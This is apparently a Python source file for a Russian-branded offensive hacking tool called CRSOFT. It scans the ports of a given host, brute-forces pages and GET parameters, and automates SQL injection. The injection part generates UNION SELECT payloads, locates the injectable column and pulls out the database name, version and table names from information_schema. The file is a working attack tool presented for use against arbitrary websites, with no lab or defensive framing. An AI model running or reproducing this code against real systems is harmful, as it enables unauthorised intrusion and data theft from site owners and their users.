import argparse
import socket
import requests
import concurrent.futures
import time
import os
from urllib.parse import urlparse
from colorama import Fore, Style, init
import signal
import re
from urllib.request import urlopen
from urllib.parse import quote
from bs4 import BeautifulSoup

init(autoreset=True)
data = {}
check = 880333070500912
start = "88005553535"
end = "88005553536"
pages_file = "pages.crs"
SQLI_ERROR_FILE = "sqli_errors.crs"
GET_PARAMS_FILE = "get_params.crs"

LOGO = f"""{Fore.RED}
 _______  _______  _______  _______  _______ _________
(  ____ \(  ____ )(  ____ \(  ___  )(  ____ \\__   __/
| (    \/| (    )|| (    \/| (   ) || (    \/   ) (   
| |      | (____)|| (_____ | |   | || (__       | |   
| |      |     __)(_____  )| |   | ||  __)      | |   
| |      | (\ (         ) || |   | || (         | |   
| (____/\| ) \ \__/\____) || (___) || )         | |   
(_______/|/   \__/\_______)(_______)|/          )_(   

@CyberRussianSquad

"""

def signal_handler(sig, frame):
    print(f"{Fore.RED}\nПрерывание программы...{Style.RESET_ALL}")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)
def load_get_params():
    if not os.path.exists(GET_PARAMS_FILE):
        print(f"{Fore.RED}Файл с GET параметрами не найден: {GET_PARAMS_FILE}{Style.RESET_ALL}")
        return []

    with open(GET_PARAMS_FILE, "r") as file:
        params = [line.strip() for line in file if line.strip()]

    if not params:
        print(f"{Fore.RED}Файл {GET_PARAMS_FILE} пуст или не содержит корректных данных.{Style.RESET_ALL}")
    return params


def load_sql_payloads(file):
    gf=(str(file))[2:-2]
    if not os.path.exists(gf):
        print(f"{Fore.RED}Файл с SQL payloads не найден: {gf}{Style.RESET_ALL}")
        return [' ']

    with open(gf, "r") as f:
        payloads = [line.strip() for line in f if line.strip()]

    if not payloads:
        print(f"{Fore.RED}Файл {f} пуст или не содержит корректных данных.{Style.RESET_ALL}")
    return payloads


def load_sqli_errors():
    if not os.path.exists(SQLI_ERROR_FILE):
        print(f"{Fore.RED}Файл с SQL ошибками не найден: {SQLI_ERROR_FILE}{Style.RESET_ALL}")
        return []

    with open(SQLI_ERROR_FILE, "r") as file:
        errors = [line.strip().lower() for line in file if line.strip()]

    if not errors:
        print(f"{Fore.RED}Файл {SQLI_ERROR_FILE} пуст или не содержит корректных данных.{Style.RESET_ALL}")
    return errors


def load_union_select_payloads():
    prefixes = ["+UNION+ALL+SELECT+", "'+UNION+ALL+SELECT+", '"+UNION+ALL+SELECT+', "/+UNION+ALL+SELECT+", r"\+UNION+ALL+SELECT+"]
    payloads = []

    for i in range(8, 101):
        for prefix in prefixes:
            payload = f"{prefix}{','.join(str(x) for x in range(1, i+1))}"
            payloads.append(payload)

    if not payloads:
        print(f"{Fore.RED}Не удалось сгенерировать UNION SELECT payloads.{Style.RESET_ALL}")
    return payloads


def contains_sqli_error(response_text, sqli_errors):
    for error in sqli_errors:
        if error in response_text.lower():
            return True
    return False


def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        sock.close()

        if result == 0:
            return port, "TCP", "Open"
    except Exception:
        pass

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        sock.sendto(b'', (target, port))
        sock.recvfrom(1024)
        sock.close()
        return port, "UDP", "Open"
    except (socket.error, socket.timeout):
        pass

    return port, None, "Closed"


def remote_port_scan(domain, max_time=120):
    open_ports = []
    start_time = time.time()

    print(f"{Fore.YELLOW}{'Port':<10}{'Protocol':<10}{'Status':<10}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'=' * 30}{Style.RESET_ALL}")

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
            futures = {executor.submit(scan_port, domain, port): port for port in range(1, 65536)}

            for future in concurrent.futures.as_completed(futures, timeout=max_time):
                try:
                    port, protocol, status = future.result()
                    if status == "Open":
                        print(f"{Fore.GREEN}{port:<10}{protocol:<10}{status:<10}{Style.RESET_ALL}")
                        open_ports.append(port)
                except Exception as e:
                    continue

                if time.time() - start_time > max_time:
                    print(f"{Fore.RED}Time limit exceeded!{Style.RESET_ALL}")
                    break
    except KeyboardInterrupt:
        print(f"{Fore.RED}\nПорт сканирование прервано пользователем.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Ошибка: {e}{Style.RESET_ALL}")

    return open_ports


def extract_domain(url):
    parsed_url = urlparse(url)
    return parsed_url.hostname


def test_get(url):
    print(f"{Fore.GREEN}Отправка GET запроса на {url}{Style.RESET_ALL}")
    try:
        response = requests.get(url)
        print(f"{Fore.GREEN}Код состояния: {response.status_code}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"{Fore.RED}\nGET запрос прерван пользователем.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Ошибка: {e}{Style.RESET_ALL}")

'''def test_post(url, data):
    print(f"{Fore.CYAN}Отправка POST запроса на {url} с данными: {data}{Style.RESET_ALL}")
    try:
        response = requests.post(url, data=data)
        print(f"{Fore.CYAN}Код состояния: {response.status_code}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"{Fore.RED}\nPOST запрос прерван пользователем.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Ошибка: {e}{Style.RESET_ALL}")

'''
def test_sql_injection(url, list, is_get=True, data=None, dbs=False, dbv=False,tables=False):
    print(f"{Fore.MAGENTA}Starting SQL injection tests...\n{Style.RESET_ALL}")

    payloads = load_sql_payloads(list)
    sqli_errors = load_sqli_errors()
    union_payloads = load_union_select_payloads()

    if not payloads:
        print(f"{Fore.RED}SQL payloads not loaded. Aborting SQL injection tests.{Style.RESET_ALL}")
        return
    if not sqli_errors:
        print(f"{Fore.RED}SQL injection errors not loaded. Aborting SQL injection tests.{Style.RESET_ALL}")
        return
    if not union_payloads:
        print(f"{Fore.RED}UNION SELECT payloads not loaded. Aborting SQL injection tests.{Style.RESET_ALL}")
        return

    for payload in payloads:
        if is_get:
            test_url = f"{url}{payload}"  # URL-encode payload
            print(f"[{Fore.GREEN}TEST{Fore.WHITE}] {Fore.LIGHTBLACK_EX}Testing GET URL: {test_url}{Style.RESET_ALL}")
            try:
                response = requests.get(test_url)
                if contains_sqli_error(response.text, sqli_errors):
                    print(
                        f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.RED}Potential SQL Injection vulnerability found with payload: {payload}{Style.RESET_ALL}")
                    print(f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.RED}Starting UNION SELECT tests.{Style.RESET_ALL}")

                for union_payload in union_payloads:
                        test_url = f"{url}{union_payload}"

                        print(
                            f"[{Fore.GREEN}TEST{Fore.WHITE}] {Fore.LIGHTBLACK_EX}Testing UNION SELECT URL: {test_url}{Style.RESET_ALL}")
                        try:
                            response1 = requests.get(test_url)

                            if not contains_sqli_error(response1.text, sqli_errors):
                                print(
                                    f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.RED}No SQL error detected with payload: {union_payload}{Style.RESET_ALL}")

                                for i in range(1, 101):
                                    # Заменяем только полные числа на check, используя регулярное выражение
                                    newp = re.sub(rf'\b{i}\b', str(check), union_payload)
                                    testn_url = f"{url}{(newp)}"  # URL-encode payload

                                    try:
                                        html = urlopen(testn_url).read()
                                        soup = BeautifulSoup(html, features="html.parser")

                                        # kill all script and style elements
                                        for script in soup(["script", "style"]):
                                            script.extract()  # rip it out
                                        textik = soup.get_text()
                                        # break into lines and remove leading and trailing space on each
                                        lines = (line.strip() for line in textik.splitlines())
                                        # break multi-headlines into a line each
                                        chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
                                        # drop blank lines
                                        textik = '\n'.join(chunk for chunk in chunks if chunk)

                                        # Проверяем наличие check в тексте ответа
                                        found = False  # Флаг для остановки после нахождения цифры
                                        if str(check) in textik:

                                            for match in re.finditer(str(check), textik):
                                                start_index = match.start()
                                                end_index = match.end()
                                                if textik[end_index] != ',':

                                                    print(f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.RED}Found injectable position: {i}")
                                                    union_i = i
                                                    found = True
                                                    break  # Останавливаем цикл при первом успешном результате


                                        if found:
                                            break  # Прерываем основной цикл, если нашли нужное число
                                    except requests.RequestException as e:
                                        print(f"{Fore.RED}Request error: {e}{Style.RESET_ALL}")

                                # Если успешен, заменить последний символ на database() и отправить новый запрос
                                if dbs:
                                    dbs_payload = re.sub(rf'\b{union_i}\b',
                                                         "CONCAT(88005553535,database(),88005553536)", union_payload)

                                    print(
                                        f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.RED}Testing database() with payload: {dbs_payload}{Style.RESET_ALL}")
                                    dbs_url = f"{url}{(dbs_payload)}"

                                    dbs_response = (dbs_url)
                                    html = urlopen(dbs_response).read()
                                    soup = BeautifulSoup(html, features="html.parser")

                                    # kill all script and style elements
                                    for script in soup(["script", "style"]):
                                        script.extract()  # rip it out

                                    # get text
                                    textik = soup.get_text()

                                    # break into lines and remove leading and trailing space on each
                                    lines = (line.strip() for line in textik.splitlines())
                                    # break multi-headlines into a line each
                                    chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
                                    # drop blank lines
                                    textik = '\n'.join(chunk for chunk in chunks if chunk)


                                    # Обработка ответа с указанием границ вывода
                                    start_idx = textik.find(start)
                                    end_idx = textik.find(end, start_idx)
                                    if start_idx != -1 and end_idx != -1:
                                        print(f'[{Fore.GREEN}+{Fore.WHITE}]',textik[start_idx + len(start):end_idx])





                                # Аналогично для проверки версии
                                if dbv:
                                    dbs_payload = re.sub(rf'\b{union_i}\b',
                                                         "CONCAT(88005553535,version(),88005553536)", union_payload)

                                    print(
                                        f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.RED}Testing version() with payload: {dbs_payload}{Style.RESET_ALL}")
                                    dbs_url = f"{url}{(dbs_payload)}"

                                    dbs_response = (dbs_url)
                                    html = urlopen(dbs_response).read()
                                    soup = BeautifulSoup(html, features="html.parser")

                                    # kill all script and style elements
                                    for script in soup(["script", "style"]):
                                        script.extract()  # rip it out

                                    # get text
                                    textik = soup.get_text()

                                    # break into lines and remove leading and trailing space on each
                                    lines = (line.strip() for line in textik.splitlines())
                                    chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
                                    textik = '\n'.join(chunk for chunk in chunks if chunk)
                                    start_idx = textik.find(start)
                                    end_idx = textik.find(end, start_idx)
                                    if start_idx != -1 and end_idx != -1:
                                        print(f'[{Fore.GREEN}+{Fore.WHITE}]', textik[start_idx + len(start):end_idx])

                                if tables:
                                    dbs_payload = re.sub(rf'\b{union_i}\b',
                                                         "group_concat(88005553535,+table_name,+88005553536)",
                                                         union_payload)
                                    dbs_payload = dbs_payload + '+FROM+information_schema.tables+WHERE+table_schema=database()'
                                    print(
                                        f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.RED}Testing tables() with payload: {dbs_payload}{Style.RESET_ALL}")
                                    dbs_url = f"{url}{dbs_payload}"

                                    dbs_response = urlopen(dbs_url)
                                    html = dbs_response.read()
                                    soup = BeautifulSoup(html, features="html.parser")

                                    # Kill all script and style elements
                                    for script in soup(["script", "style"]):
                                        script.extract()  # rip it out

                                    # Get text
                                    textik = soup.get_text()

                                    # Break into lines and remove leading and trailing space on each
                                    lines = (line.strip() for line in textik.splitlines())
                                    # Break multi-headlines into a line each
                                    chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
                                    # Drop blank lines
                                    textik = '\n'.join(chunk for chunk in chunks if chunk)

                                    # Find all instances of text between start and end markers
                                    start_idx = 0
                                    while True:
                                        start_idx = textik.find(start, start_idx)
                                        if start_idx == -1:
                                            break
                                        end_idx = textik.find(end, start_idx)
                                        if end_idx == -1:
                                            break
                                        # Extract and format the text
                                        extracted_text = textik[start_idx + len(start):end_idx]
                                        formatted_text = f'{extracted_text}'
                                        if ', table_name,' in formatted_text:
                                            pass
                                        else:
                                            print(f'[{Fore.GREEN}+{Fore.WHITE}] {formatted_text}')
                                        start_idx = end_idx + len(end)


                                return





                        except requests.RequestException as e:
                            print(f"{Fore.RED}Request error: {e}{Style.RESET_ALL}")
            except requests.RequestException as e:
                print(f"{Fore.RED}Request error: {e}{Style.RESET_ALL}")
        '''else:
            for key in data:
                data_with_payload = data.copy()
                data_with_payload[key] = payload
                print(
                    f"[{Fore.GREEN}TEST{Fore.WHITE}] {Fore.LIGHTBLACK_EX}Testing POST with data: {data_with_payload}{Style.RESET_ALL}")
                try:
                    response = requests.post(url, data=data_with_payload)
                    if contains_sqli_error(response.text, sqli_errors):
                        print(
                            f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.RED}Potential SQL Injection vulnerability found with payload: {payload}{Style.RESET_ALL}")
                        print(f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.RED}Starting UNION SELECT tests.{Style.RESET_ALL}")

                        for union_payload in union_payloads:
                            data_with_union_payload = data.copy()
                            data_with_union_payload[key] = union_payload
                            print(
                                f"[{Fore.GREEN}TEST{Fore.WHITE}] {Fore.LIGHTBLACK_EX}Testing UNION SELECT with data: {data_with_union_payload}{Style.RESET_ALL}")
                            try:
                                response1 = requests.post(url, data=data_with_union_payload)
                                if not contains_sqli_error(response1.text, sqli_errors):
                                    print(
                                        f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.YELLOW}No SQL error detected with payload: {union_payload}{Style.RESET_ALL}")
                                    print(
                                        f"{Fore.CYAN}Response: {response1.text[:200]}...{Style.RESET_ALL}")  # Вывести часть ответа для удобства

                                    # Если успешен, заменить последний символ на database() и отправить новый запрос
                                    if dbs:
                                        dbs_payload = union_payload[:-1] + "CONCAT(' crsdb:',database(),':crsdb ')"
                                        print(
                                            f"[{Fore.GREEN}INFO{Fore.WHITE}] {Fore.YELLOW}Testing database() with payload: {dbs_payload}{Style.RESET_ALL}")
                                        data_with_dbs_payload = data.copy()
                                        data_with_dbs_payload[key] = dbs_payload
                                        dbs_response = requests.post(url, data=data_with_dbs_payload)
                                        print(
                                            f"{Fore.YELLOW}Database info: {Fore.CYAN}{dbs_response.text}{Style.RESET_ALL}")

                                    return  # Остановить сканирование после успешного результата
                            except requests.RequestException as e:
                                print(f"{Fore.RED}Request error: {e}{Style.RESET_ALL}")
                except requests.RequestException as e:
                    print(f"{Fore.RED}Request error: {e}{Style.RESET_ALL}")

'''
def load_pages():
    if not os.path.exists(pages_file):
        print(f"{Fore.RED}Файл со страницами не найден: {pages_file}{Style.RESET_ALL}")
        return []

    with open(pages_file, "r") as file:
        pages = [line.strip() for line in file if line.strip()]

    if not pages:
        print(f"{Fore.RED}Файл {pages_file} пуст или не содержит корректных данных.{Style.RESET_ALL}")
    return pages


def scan_pages(base_url):
    pages = load_pages()

    if not pages:
        print(f"{Fore.RED}Страницы не загружены. Операция прервана.{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}{'Page':<30}{'Status':<10}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'=' * 40}{Style.RESET_ALL}")

    for page in pages:
        full_url = f"{base_url}/{page}"
        try:
            response = requests.get(full_url)
            status = response.status_code
            if status == 200:
                print(f"{Fore.GREEN}{page:<30}{status:<10}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}{page:<30}{status:<10}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}{full_url:<30}Error{Style.RESET_ALL}")
            print(f"{Fore.RED}Ошибка: {e}{Style.RESET_ALL}")


def is_content_different(content1, content2):
    """Сравниваем два HTML-контента для проверки на различия"""
    return content1 != content2


def search_get_params(base_url):
    pages = load_pages()
    get_params = load_get_params()

    if not pages:
        print(f"{Fore.RED}Страницы не загружены. Операция прервана.{Style.RESET_ALL}")
        return
    if not get_params:
        print(f"{Fore.RED}GET параметры не загружены. Операция прервана.{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}{'Page':<30}{'Param':<20}{'Status':<10}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'=' * 60}{Style.RESET_ALL}")

    for page in pages:
        for param in get_params:
            full_url = f"{base_url}/{page}?{param}=-1"
            try:
                original_response = requests.get(f"{base_url}/{page}")
                original_content = original_response.text
                test_response = requests.get(full_url)
                status = test_response.status_code
                test_content = test_response.text
                if status == 200:
                    if is_content_different(original_content, test_content):
                        print(f"{Fore.GREEN}{page:<30}{param:<20}{status:<10}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}{page:<30}{param:<20}{status:<10}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}{page:<30}{param:<20}{status:<10}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}{full_url:<30}Error{Style.RESET_ALL}")
                print(f"{Fore.RED}Ошибка: {e}{Style.RESET_ALL}")

def main():
    print(LOGO)



    '''parser.add_argument("--post", help="URL for POST request")
    parser.add_argument("--data", nargs='+', help="Data for POST request in format field1=value1 field2=value2")'''
    parser = argparse.ArgumentParser(description=f"{Fore.CYAN}CRSOFT - cool hacking tool from RUSSIA{Style.RESET_ALL}")
    parser.add_argument("--get", help="URL for GET request")

    parser.add_argument("--sql", action="store_true", help="Test for SQL injection vulnerabilities")
    parser.add_argument("--list", nargs='+', help="Required if you use --sql , use the format --list <FILEPATH>")
    parser.add_argument("--dbs", action="store_true", help="Displays the active database on the vulnerable page")
    parser.add_argument("--dbv", action="store_true", help="Displays current version of database")
    parser.add_argument("--tables", action="store_true", help="Displays current tables of database")

    parser.add_argument("--ports", help="IP address or hostname to scan ports")
    parser.add_argument("--pages", help="Base URL to scan multiple pages listed in pages.crs")
    parser.add_argument("--search-get", help="Base URL to search GET parameters on pages listed in pages.crs")

    args = parser.parse_args()


    '''elif args.post:
        if not args.data:
            print(f"{Fore.RED}Error: Data for POST request not provided. Use --data to specify POST data.{Style.RESET_ALL}")
            return

        data = dict(param.split('=') for param in args.data)
        test_post(args.post, data)

        if args.sql:
            if not args.list:
                print(f"{Fore.RED}Error: List for SQL request not provided. Use --list to specify list of payloads.{Style.RESET_ALL}")
                return
            test_sql_injection(args.post, is_get=False, data=data, dbs=args.dbs)
        if args.ports:
            domain = extract_domain(args.post)
            if domain:
                remote_port_scan(domain)
            else:
                print(f"{Fore.RED}Invalid URL for port scanning.{Style.RESET_ALL}")'''
    if args.get:
        test_get(args.get)
        if args.sql:
            
            test_sql_injection(args.get, is_get=True, list=args.list, dbs=args.dbs, dbv=args.dbv,tables=args.tables)
        if args.ports:
            domain = extract_domain(args.get)
            if domain:
                remote_port_scan(domain)
            else:
                print(f"{Fore.RED}Invalid URL for port scanning.{Style.RESET_ALL}")
    elif args.pages:
        scan_pages(args.pages)
    elif args.search_get:
        search_get_params(args.search_get)
    elif args.ports:
        domain = args.ports
        remote_port_scan(domain)
    else:
        print(f"{Fore.YELLOW}No action specified. Use --get, --ports, --pages, or --search-get.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
